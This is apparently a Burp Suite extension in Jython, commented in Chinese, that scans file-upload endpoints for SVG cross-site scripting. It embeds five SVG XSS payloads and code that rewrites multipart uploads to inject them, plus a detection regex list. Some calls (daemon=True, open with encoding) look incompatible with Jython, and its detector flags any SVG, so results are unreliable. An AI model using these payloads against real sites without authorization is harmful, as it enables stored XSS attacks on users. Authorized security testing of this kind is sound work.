# -*- coding: utf-8 -*-
"""
SVG XSS Upload Scanner — Burp Suite 被动扫描扩展
检测文件上传接口的 SVG XSS 漏洞, 支持自动/手动扫描。

功能:
  1. 自动检测 multipart 上传请求, 注入 SVG payload 测试 XSS
  2. 右键菜单 "Send to SVG XSS Scanner" 手动发送
  3. HTML 美化响应展示 + JSON 语法高亮
  4. 扫描记录自动保存
  5. 多编码自动识别 (UTF-8 / GBK / GB2312 / Latin1)
"""

from burp import IBurpExtender, IContextMenuFactory, ITab, IHttpListener
from javax.swing import JPanel, JTabbedPane, JTextArea, JScrollPane, JSplitPane
from javax.swing import JButton, JLabel, JTextField, JCheckBox, JEditorPane
from javax.swing import BoxLayout, BorderFactory, SwingUtilities
from java.awt import BorderLayout, Dimension, Font
from java.awt.event import ActionListener
from javax import swing
from java.lang import String as JString
import re
import threading
import os
import time
import sys
import json
from datetime import datetime


class BurpExtender(IBurpExtender, IContextMenuFactory, ITab, IHttpListener):

    # ========== 内置 SVG XSS payload 库 ==========
    DEFAULT_PAYLOADS = [
        # 基础事件注入
        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
        '<rect width="100%" height="100%" fill="red"/></svg>',

        # CDATA 混淆绕过
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<script>alert(document.domain)</script></svg>',

        # 编码绕过
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<use href="data:image/svg+xml,'
        '&lt;svg xmlns=&apos;http://www.w3.org/2000/svg&apos; '
        'onload=&apos;alert(1)&apos;&gt;&lt;/svg&gt;"/></svg>',

        # 动画事件
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<set attributeName="onbegin" to="alert(1)" begin="0s"/>'
        '<animate attributeName="x" onbegin="alert(1)" begin="0s"/></svg>',

        # foreignObject 绕过
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml">'
        '<iframe src="javascript:alert(1)"></iframe>'
        '</body></foreignObject></svg>',
    ]

    # XSS 检测特征库
    XSS_INDICATORS = [
        r'<svg[\s>]', r'onload\s*=', r'onerror\s*=', r'onbegin\s*=',
        r'javascript:', r'alert\s*\(', r'<script[\s>]', r'image/svg\+xml',
        r'<foreignObject[\s>]', r'eval\s*\(', r'document\.cookie',
        r'document\.domain', r'document\.write',
    ]

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        callbacks.setExtensionName("SVG XSS Upload Scanner")
        callbacks.registerContextMenuFactory(self)
        callbacks.registerHttpListener(self)

        self._mainPanel = JPanel(BorderLayout())
        self._selected_payload_index = 0
        self._scan_count = 0
        self._xss_found_count = 0
        self.initUI()

        callbacks.addSuiteTab(self)

        self.log_dir = os.path.join(os.path.expanduser("~"), "BurpSVGXSSLogs")
        if not os.path.exists(self.log_dir):
            os.makedirs(self.log_dir)

        callbacks.printOutput("[SVG XSS Scanner] Loaded successfully")
        callbacks.printOutput("[SVG XSS Scanner] Log directory: " + self.log_dir)
        self._log_to_console("Plugin started at: " +
                             datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    # ===================== UI =====================

    def initUI(self):
        controlPanel = JPanel()
        controlPanel.setLayout(BoxLayout(controlPanel, BoxLayout.Y_AXIS))
        controlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10))

        # --- 标题 + 统计 ---
        self.statsLabel = JLabel("Scans: 0  |  XSS Found: 0")
        self.statsLabel.setFont(Font("Arial", Font.PLAIN, 11))
        controlPanel.add(self.statsLabel)
        controlPanel.add(JLabel(" "))

        # --- Payload 选择 ---
        payloadLabel = JLabel("SVG XSS Payload:")
        controlPanel.add(payloadLabel)

        self.payloadText = JTextArea(self.DEFAULT_PAYLOADS[0], 4, 50)
        self.payloadText.setLineWrap(True)
        payloadScroll = JScrollPane(self.payloadText)
        payloadScroll.setPreferredSize(Dimension(500, 70))
        controlPanel.add(payloadScroll)

        # --- Payload 切换按钮 ---
        payloadBtnPanel = JPanel()
        self.prevPayloadBtn = JButton("< Prev")
        self.prevPayloadBtn.addActionListener(PrevPayloadListener(self))
        payloadBtnPanel.add(self.prevPayloadBtn)

        self.payloadIndexLabel = JLabel("1/" + str(len(self.DEFAULT_PAYLOADS)))
        payloadBtnPanel.add(self.payloadIndexLabel)

        self.nextPayloadBtn = JButton("Next >")
        self.nextPayloadBtn.addActionListener(NextPayloadListener(self))
        payloadBtnPanel.add(self.nextPayloadBtn)
        controlPanel.add(payloadBtnPanel)
        controlPanel.add(JLabel(" "))

        # --- 目标域名过滤 ---
        self.domainText = JTextField(25)
        domainRow = JPanel()
        domainRow.add(JLabel("Target Host (optional): "))
        domainRow.add(self.domainText)
        controlPanel.add(domainRow)
        controlPanel.add(JLabel(" "))

        # --- 被动扫描配置 ---
        self.passiveScanCheckbox = JCheckBox(
            "Passive scan: detect but do NOT modify proxy traffic", True)
        controlPanel.add(self.passiveScanCheckbox)

        self.autoInjectCheckbox = JCheckBox(
            "Auto-inject SVG payload into uploads (separate request, safe)", False)
        controlPanel.add(self.autoInjectCheckbox)

        controlPanel.add(JLabel(" "))
        self.saveLogCheckbox = JCheckBox("Auto save scan records", True)
        controlPanel.add(self.saveLogCheckbox)
        self.prettyPrintCheckbox = JCheckBox("Pretty print responses", True)
        controlPanel.add(self.prettyPrintCheckbox)

        controlPanel.add(JLabel(" "))

        # --- 按钮面板 ---
        buttonPanel = JPanel()
        self.testButton = JButton("Test Payload (console)")
        self.testButton.addActionListener(TestButtonListener(self))
        buttonPanel.add(self.testButton)

        self.findAllBtn = JButton("Find All SVG in Site Map")
        self.findAllBtn.addActionListener(FindAllListener(self))
        buttonPanel.add(self.findAllBtn)

        self.clearButton = JButton("Clear Results")
        self.clearButton.addActionListener(ClearButtonListener(self))
        buttonPanel.add(self.clearButton)

        self.viewLogButton = JButton("Open Log Folder")
        self.viewLogButton.addActionListener(ViewLogButtonListener(self))
        buttonPanel.add(self.viewLogButton)

        controlPanel.add(buttonPanel)

        # --- 结果区域 ---
        self.resultText = JTextArea(12, 60)
        self.resultText.setEditable(False)
        self.resultText.setFont(Font("Monospaced", Font.PLAIN, 12))
        resultScroll = JScrollPane(self.resultText)
        resultScroll.setPreferredSize(Dimension(600, 160))

        # --- 请求/响应显示 ---
        self.requestText = JTextArea(8, 60)
        self.requestText.setEditable(False)
        self.requestText.setFont(Font("Monospaced", Font.PLAIN, 12))
        requestScroll = JScrollPane(self.requestText)

        self.responseText = JTextArea(8, 60)
        self.responseText.setEditable(False)
        self.responseText.setFont(Font("Monospaced", Font.PLAIN, 12))
        responseScroll = JScrollPane(self.responseText)

        self.htmlResponsePane = JEditorPane()
        self.htmlResponsePane.setContentType("text/html")
        self.htmlResponsePane.setEditable(False)
        htmlResponseScroll = JScrollPane(self.htmlResponsePane)

        self.tabbedPane = JTabbedPane()
        self.tabbedPane.addTab("Request", requestScroll)
        self.tabbedPane.addTab("Response", responseScroll)
        self.tabbedPane.addTab("Formatted", htmlResponseScroll)

        splitPane = JSplitPane(JSplitPane.VERTICAL_SPLIT)
        splitPane.setTopComponent(resultScroll)
        splitPane.setBottomComponent(self.tabbedPane)
        splitPane.setDividerLocation(0.45)

        self._mainPanel.add(controlPanel, BorderLayout.NORTH)
        self._mainPanel.add(splitPane, BorderLayout.CENTER)

    # ===================== 右键菜单 =====================

    def createMenuItems(self, invocation):
        menu = []
        ctx = invocation.getInvocationContext()
        if ctx in (invocation.CONTEXT_MESSAGE_EDITOR_REQUEST,
                   invocation.CONTEXT_MESSAGE_VIEWER_REQUEST):
            menuItem = swing.JMenuItem("Send to SVG XSS Scanner")
            menuItem.addActionListener(MenuItemListener(self, invocation))
            menu.append(menuItem)
        return menu

    # ===================== HTTP 监听 (被动扫描) =====================

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # 只处理 Proxy 和 Scanner 中的请求
        if toolFlag not in (self._callbacks.TOOL_PROXY,
                            self._callbacks.TOOL_SCANNER):
            return
        if not messageIsRequest:
            return

        # 快速过滤：Content-Type 是否包含 multipart
        request = messageInfo.getRequest()
        analyzed = self._helpers.analyzeRequest(messageInfo.getHttpService(), request)
        if not self._has_multipart_body(analyzed.getHeaders()):
            return

        # 被动模式: 仅检测和记录, 不修改流量
        if self.passiveScanCheckbox.isSelected():
            self._passive_scan(messageInfo, analyzed, request)

        # 安全自动注入: 单独发请求, 不修改代理流量
        if self.autoInjectCheckbox.isSelected():
            thread = threading.Thread(
                target=self._safe_inject_and_scan,
                args=(messageInfo, analyzed, request),
                daemon=True
            )
            thread.start()

    def _has_multipart_body(self, headers):
        for h in headers:
            if h.lower().startswith("content-type:") and \
                    "multipart/form-data" in h.lower():
                return True
        return False

    def _passive_scan(self, messageInfo, analyzedRequest, request):
        """被动扫描: 只做信息收集, 不修改任何流量"""
        try:
            host = messageInfo.getHttpService().getHost()
            url = analyzedRequest.getUrl()

            # 检查文件名是否已包含 SVG 相关
            body_bytes = request[analyzedRequest.getBodyOffset():]
            body_str = self._bytes_to_string(body_bytes)
            svg_indicators = ['.svg', 'image/svg', '<svg']
            for ind in svg_indicators:
                if ind.lower() in body_str.lower():
                    self._log_to_console(
                        "[PASSIVE] SVG file detected in upload to " +
                        str(url))
                    break
        except Exception:
            pass  # 被动模式静默处理

    def _safe_inject_and_scan(self, messageInfo, analyzedRequest, request):
        """安全注入: 构造新请求单独发送, 不影响原始流量"""
        try:
            httpService = messageInfo.getHttpService()
            modified = self._inject_svg_payload(analyzedRequest, request)

            if not modified:
                self._log_to_console("[!] Failed to inject SVG payload")
                return

            SwingUtilities.invokeLater(
                lambda: self.requestText.setText(
                    self._helpers.bytesToString(modified)))

            response_info = self._callbacks.makeHttpRequest(httpService, modified)
            self._process_response(response_info, analyzedRequest, modified)
        except Exception as e:
            self._log_to_console("[!] Inject error: " + str(e))

    # ===================== 手动扫描入口 =====================

    def sendToScanner(self, invocation):
        thread = threading.Thread(
            target=self._sendToScannerThread, args=(invocation,), daemon=True)
        thread.start()

    def _sendToScannerThread(self, invocation):
        try:
            messageInfo = invocation.getSelectedMessages()[0]
            httpService = messageInfo.getHttpService()
            request = messageInfo.getRequest()
            analyzedRequest = self._helpers.analyzeRequest(httpService, request)

            modified = self._inject_svg_payload(analyzedRequest, request)

            if not modified:
                self._log_to_console("[!] Cannot inject SVG payload")
                return

            SwingUtilities.invokeLater(
                lambda: self.requestText.setText(
                    self._helpers.bytesToString(modified)))

            response_info = self._callbacks.makeHttpRequest(httpService, modified)
            self._process_response(response_info, analyzedRequest, modified)
        except Exception as e:
            self._log_to_console("[!] Scan error: " + str(e))
            import traceback
            self._log_to_console(traceback.format_exc())

    # ===================== 核心: SVG Payload 注入 =====================

    def _inject_svg_payload(self, analyzedRequest, originalRequest):
        """将上传文件替换为 SVG XSS payload, 返回新的 request bytes"""
        try:
            headers = list(analyzedRequest.getHeaders())
            body_bytes = originalRequest[analyzedRequest.getBodyOffset():]
            body_str = self._bytes_to_string(body_bytes)

            boundary = self._get_boundary(headers)
            if not boundary:
                return None

            svg_payload = self.payloadText.getText().strip()
            modified_body = self._replace_file_in_multipart(body_str, boundary,
                                                            svg_payload)
            if modified_body is None:
                return None

            modified_headers = self._update_content_length(
                headers, len(modified_body))

            return self._helpers.buildHttpMessage(modified_headers,
                                                  modified_body)
        except Exception as e:
            self._log_to_console("[!] inject_payload error: " + str(e))
            return None

    def _get_boundary(self, headers):
        for h in headers:
            if h.lower().startswith("content-type:"):
                m = re.search(r'boundary=([^\s;]+)', h)
                if m:
                    return m.group(1).strip('"')
        return None

    def _replace_file_in_multipart(self, body, boundary, new_content):
        """
        正确解析 multipart/form-data 并替换文件字段内容。

        multipart body 格式:
          --BOUNDARY\r\n
          Content-Disposition: form-data; ...; filename="x.jpg"\r\n
          Content-Type: image/jpeg\r\n
          \r\n
          <file content>
          \r\n--BOUNDARY\r\n
          ... more parts ...
          \r\n--BOUNDARY--\r\n
        """
        sep = "--" + boundary
        # 按分隔符切分; 每段以 \r\n 开头 (除第一段和最后一段)
        parts = body.split(sep)

        if len(parts) < 2:
            return None

        modified = False
        new_parts = []

        for i, part in enumerate(parts):
            if i == 0:
                # 第一个边界之前的内容 (通常为空或 preamble)
                new_parts.append(part)
                continue

            # 检查是否是文件字段
            if "filename=" in part and not modified:
                # 分离段头与段体
                header_body_split = part.find("\r\n\r\n")
                if header_body_split == -1:
                    new_parts.append(part)
                    continue

                part_headers = part[:header_body_split + 2]   # 包含末尾 \r\n
                part_body_start = header_body_split + 4        # 跳过 \r\n\r\n

                # 替换 Content-Disposition 中的文件名
                part_headers = re.sub(
                    r'filename="[^"]*"',
                    'filename="xss_test.svg"',
                    part_headers
                )
                # 替换 Content-Type 为 SVG
                part_headers = re.sub(
                    r'Content-Type:\s*[^\r\n]+',
                    'Content-Type: image/svg+xml',
                    part_headers,
                    flags=re.IGNORECASE
                )

                # 构造新段: 头 + 空行 + 新内容 + (原有结尾符)
                tail = part[part_body_start:]
                # 找到原始 body 结束的位置 (下一个边界标记之前)
                body_end = tail.rfind("\r\n")
                if body_end == -1:
                    body_end = len(tail)

                new_part = part_headers + "\r\n" + new_content + tail[body_end:]
                new_parts.append(new_part)
                modified = True
            else:
                new_parts.append(part)

        if not modified:
            return None

        return sep.join(new_parts)

    def _update_content_length(self, headers, body_length):
        new_headers = []
        found_cl = False
        for h in headers:
            if h.lower().startswith("content-length:"):
                new_headers.append("Content-Length: " + str(body_length))
                found_cl = True
            else:
                new_headers.append(h)
        if not found_cl:
            new_headers.append("Content-Length: " + str(body_length))
        return new_headers

    # ===================== 响应处理 =====================

    def _process_response(self, response_info, analyzedRequest, modifiedRequest):
        """处理响应: 解码、检测 XSS、更新 UI"""
        try:
            httpService = response_info.getHttpService()
            response_bytes = response_info.getResponse()
            if response_bytes is None:
                self._log_to_console("[!] No response received")
                return

            analyzedResponse = self._helpers.analyzeResponse(response_bytes)
            response_str = self._decode_response(response_bytes, analyzedResponse)
            xss_detected = self._detect_xss(response_str)

            self._scan_count += 1
            if xss_detected:
                self._xss_found_count += 1

            def updateUI():
                self.statsLabel.setText(
                    "Scans: %d  |  XSS Found: %d" %
                    (self._scan_count, self._xss_found_count))

                self.responseText.setText(response_str)

                if self.prettyPrintCheckbox.isSelected():
                    html_content = self._build_html_response(
                        response_str, analyzedResponse, xss_detected,
                        analyzedRequest)
                    self.htmlResponsePane.setContentType("text/html")
                    self.htmlResponsePane.setText(html_content)
                    self.tabbedPane.setSelectedIndex(2)
                else:
                    self.tabbedPane.setSelectedIndex(1)

                # 日志
                try:
                    url_str = str(analyzedRequest.getUrl())
                except Exception:
                    url_str = "http://" + httpService.getHost() + \
                              ":" + str(httpService.getPort())

                lines = [
                    "=" * 55,
                    "Target:    " + url_str,
                    "Status:    " + str(analyzedResponse.getStatusCode()),
                    "Length:    " + str(len(response_bytes) -
                                        analyzedResponse.getBodyOffset()),
                    "XSS:       " + ("FOUND!" if xss_detected else "Not detected"),
                    "=" * 55,
                ]
                self._log_to_console("\n".join(lines))

                if self.saveLogCheckbox.isSelected():
                    self._save_scan_record(
                        url_str, analyzedResponse.getStatusCode(),
                        xss_detected,
                        self._helpers.bytesToString(modifiedRequest),
                        response_str)

                if xss_detected:
                    self._callbacks.issueAlert(
                        "SVG XSS Vulnerability",
                        "Response contains SVG content or XSS features.\n"
                        "Upload endpoint may be vulnerable to SVG XSS.\n\n"
                        "URL: " + url_str)

            SwingUtilities.invokeLater(updateUI)
        except Exception as e:
            self._log_to_console("[!] Response processing error: " + str(e))

    def _detect_xss(self, response_str):
        for indicator in self.XSS_INDICATORS:
            if re.search(indicator, response_str, re.IGNORECASE):
                return True
        return False

    # ===================== 响应解码 (修复 Jython 兼容) =====================

    def _decode_response(self, response_bytes, analyzedResponse):
        """
        正确解码响应体。
        使用 java.lang.String(bytes, charset) 避免 Jython byte[].tostring() 问题。
        """
        try:
            headers = analyzedResponse.getHeaders()
            charset = 'utf-8'

            for h in headers:
                if h.lower().startswith('content-type:'):
                    m = re.search(r'charset=([^\s;]+)', h, re.IGNORECASE)
                    if m:
                        cs = m.group(1).lower().strip('"').strip("'")
                        if cs in ('gb2312', 'gbk', 'gb18030'):
                            charset = 'GBK'
                        elif cs in ('big5',):
                            charset = 'Big5'
                        else:
                            charset = cs
                    break

            body_offset = analyzedResponse.getBodyOffset()
            body_bytes = response_bytes[body_offset:]

            # 使用 Java String 构造, 可靠处理所有编码
            try:
                body_str = JString(body_bytes, charset)
            except Exception:
                # 回退: 尝试常用编码
                for cs in ('UTF-8', 'GBK', 'ISO-8859-1', 'windows-1252'):
                    try:
                        body_str = JString(body_bytes, cs)
                        break
                    except Exception:
                        continue
                else:
                    body_str = self._helpers.bytesToString(body_bytes)

            # 重新组装头部 + 解码后的 body
            header_str = self._helpers.bytesToString(
                response_bytes[:body_offset])
            return header_str + body_str
        except Exception:
            return self._helpers.bytesToString(response_bytes)

    def _bytes_to_string(self, byte_array):
        """Jython 安全的 bytes → str 转换"""
        return self._helpers.bytesToString(byte_array)

    # ===================== HTML 美化响应 =====================

    def _build_html_response(self, response_str, analyzedResponse,
                             xss_detected, analyzedRequest):
        try:
            headers = analyzedResponse.getHeaders()
            status_code = analyzedResponse.getStatusCode()
            body_offset = analyzedResponse.getBodyOffset()
            body = response_str[body_offset:] if body_offset < len(
                response_str) else response_str

            content_type = ""
            for h in headers:
                if h.lower().startswith("content-type:"):
                    content_type = h.split(":", 1)[1].strip()
                    break

            if status_code < 300:
                status_color, status_icon = "#28a745", "OK"
            elif status_code < 400:
                status_color, status_icon = "#17a2b8", "Redirect"
            else:
                status_color, status_icon = "#dc3545", "Error"

            parts = [
                '<html><head><meta charset="UTF-8"><style>',
                'body{font-family:Consolas,Monaco,monospace;font-size:12px;',
                'background:#1e1e1e;color:#d4d4d4;margin:0;padding:10px}',
                '.container{background:#252526;padding:15px;border-radius:6px;',
                'border:1px solid #3c3c3c}',
                '.status{font-size:16px;font-weight:bold}',
                '.xss-warn{background:#5a3e00;color:#ffcc00;padding:10px;',
                'border:1px solid #ff9500;border-radius:4px;margin:10px 0}',
                '.header{color:#569cd6;font-weight:bold;margin-top:8px}',
                '.key{color:#9cdcfe} .string{color:#ce9178}',
                '.number{color:#b5cea8} .boolean{color:#569cd6} .null{color:#808080}',
                'pre{background:#1e1e1e;padding:10px;border-radius:4px;',
                'border:1px solid #3c3c3c;overflow-x:auto;white-space:pre-wrap}',
                '</style></head><body><div class="container">',
                '<div class="status" style="color:', status_color, '">',
                status_icon, ' HTTP ', str(status_code), '</div>',
            ]
            result = ''.join(parts)

            if xss_detected:
                result += (
                    '<div class="xss-warn">'
                    '<b>XSS FOUND</b> &mdash; Response contains SVG or '
                    'script features. Upload endpoint may be vulnerable.'
                    '</div>'
                )

            # 目标 URL
            try:
                result += '<div class="header">Target: ' + \
                    self._escape_html(str(analyzedRequest.getUrl())) + '</div>'
            except Exception:
                pass

            # 响应头
            result += '<div class="header">Response Headers:</div><pre>'
            for h in headers:
                result += self._escape_html(h) + '\n'
            result += '</pre>'

            # 响应体
            result += '<div class="header">Response Body:</div>'
            if 'application/json' in content_type.lower():
                result += self._format_json_body(body)
            elif 'text/' in content_type.lower():
                result += '<pre>' + self._escape_html(body[:8000]) + '</pre>'
            else:
                result += '<pre>[Content-Type: ' + \
                    self._escape_html(content_type) + \
                    ']</pre><pre>' + self._escape_html(body[:4000]) + '</pre>'

            result += '</div></body></html>'
            return result
        except Exception as e:
            return '<html><body>Error: ' + self._escape_html(str(e)) + \
                '</body></html>'

    def _format_json_body(self, body_str):
        try:
            parsed = json.loads(body_str)
            formatted = json.dumps(parsed, indent=2, ensure_ascii=False)
            formatted = self._escape_html(formatted)
            # 语法高亮
            formatted = re.sub(
                r'(&quot;(?:\\&quot;|[^&])*&quot;)\s*:',
                r'<span class="key">\1</span>:', formatted)
            formatted = re.sub(
                r':\s*(&quot;(?:\\&quot;|[^&])*&quot;)',
                r': <span class="string">\1</span>', formatted)
            formatted = re.sub(
                r':\s*(\d+(?:\.\d+)?)',
                r': <span class="number">\1</span>', formatted)
            formatted = re.sub(
                r':\s*(\btrue\b|\bfalse\b)',
                r': <span class="boolean">\1</span>', formatted)
            formatted = re.sub(
                r':\s*(\bnull\b)',
                r': <span class="null">\1</span>', formatted)
            return '<pre>' + formatted + '</pre>'
        except Exception:
            return '<pre>' + self._escape_html(body_str[:5000]) + '</pre>'

    def _escape_html(self, text):
        if text is None:
            return ""
        text = str(text)
        text = text.replace('&', '&amp;')
        text = text.replace('<', '&lt;')
        text = text.replace('>', '&gt;')
        text = text.replace('"', '&quot;')
        return text

    # ===================== 扫描记录 =====================

    def _save_scan_record(self, url, status_code, xss_detected, request,
                          response):
        try:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:18]
            tag = "XSS_" if xss_detected else "OK_"
            filename = "scan_{}{}.txt".format(tag, ts)
            filepath = os.path.join(self.log_dir, filename)

            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 80 + "\n")
                f.write("SVG XSS Scan Record - " +
                        datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
                f.write("=" * 80 + "\n\n")
                f.write("Target URL: {}\n".format(url))
                f.write("Status Code: {}\n".format(status_code))
                f.write("XSS: {}\n".format(
                    "FOUND" if xss_detected else "Not Found"))
                f.write("\n" + "-" * 40 + "\nRequest:\n" + "-" * 40 + "\n")
                f.write(request)
                f.write("\n\n" + "-" * 40 + "\nResponse:\n" + "-" * 40 + "\n")
                f.write(response)
                f.write("\n\n" + "=" * 80 + "\n")

            self._log_to_console("[SAVED] " + filepath)
        except Exception as e:
            self._log_to_console("[!] Save error: " + str(e))

    def showScanRecords(self):
        try:
            if os.path.exists(self.log_dir):
                import subprocess
                if os.name == 'nt':
                    os.startfile(self.log_dir)
                elif sys.platform == 'darwin':
                    subprocess.call(['open', self.log_dir])
                else:
                    subprocess.call(['xdg-open', self.log_dir])
            else:
                self._log_to_console("[!] Log directory does not exist")
        except Exception as e:
            self._log_to_console("[!] Open dir error: " + str(e))

    # ===================== Site Map 查找 =====================

    def findSvgInSiteMap(self):
        """在 Burp Site Map 中查找 SVG 文件"""
        thread = threading.Thread(target=self._find_svg_thread, daemon=True)
        thread.start()

    def _find_svg_thread(self):
        try:
            siteMap = self._callbacks.getSiteMap(None)
            count = 0
            found_items = []

            for item in siteMap:
                try:
                    url = str(item.getUrl())
                    if '.svg' in url.lower():
                        found_items.append(url)
                        count += 1
                except Exception:
                    continue

            def update():
                self._log_to_console("=" * 55)
                self._log_to_console(
                    "Site Map SVG Search: found %d item(s)" % count)
                for u in found_items[:50]:
                    self._log_to_console("  " + u)
                if count > 50:
                    self._log_to_console(
                        "  ... and %d more" % (count - 50))
                self._log_to_console("=" * 55)
            SwingUtilities.invokeLater(update)
        except Exception as e:
            self._log_to_console("[!] Site Map search error: " + str(e))

    # ===================== 日志 =====================

    def _log_to_console(self, message):
        """线程安全的日志输出"""
        def append():
            self.resultText.append(message + "\n")
        SwingUtilities.invokeLater(append)
        try:
            self._callbacks.printOutput(message)
        except Exception:
            pass

    # ===================== Burp Tab 接口 =====================

    def getTabCaption(self):
        return "SVG XSS Scanner"

    def getUiComponent(self):
        return self._mainPanel


# ===================== UI 监听器 =====================

class MenuItemListener(ActionListener):
    def __init__(self, extender, invocation):
        self._extender = extender
        self._invocation = invocation

    def actionPerformed(self, event):
        self._extender.sendToScanner(self._invocation)


class TestButtonListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        self._extender._log_to_console(
            "[TEST] Payload: " + self._extender.payloadText.getText()[:200])


class PrevPayloadListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        ext = self._extender
        ext._selected_payload_index = (
            ext._selected_payload_index - 1) % len(ext.DEFAULT_PAYLOADS)
        ext.payloadText.setText(
            ext.DEFAULT_PAYLOADS[ext._selected_payload_index])
        ext.payloadIndexLabel.setText(
            str(ext._selected_payload_index + 1) + "/" +
            str(len(ext.DEFAULT_PAYLOADS)))


class NextPayloadListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        ext = self._extender
        ext._selected_payload_index = (
            ext._selected_payload_index + 1) % len(ext.DEFAULT_PAYLOADS)
        ext.payloadText.setText(
            ext.DEFAULT_PAYLOADS[ext._selected_payload_index])
        ext.payloadIndexLabel.setText(
            str(ext._selected_payload_index + 1) + "/" +
            str(len(ext.DEFAULT_PAYLOADS)))


class FindAllListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        self._extender.findSvgInSiteMap()


class ClearButtonListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        self._extender.resultText.setText("")
        self._extender.requestText.setText("")
        self._extender.responseText.setText("")
        self._extender._scan_count = 0
        self._extender._xss_found_count = 0
        self._extender.statsLabel.setText("Scans: 0  |  XSS Found: 0")


class ViewLogButtonListener(ActionListener):
    def __init__(self, extender):
        self._extender = extender

    def actionPerformed(self, event):
        self._extender.showScanRecords()
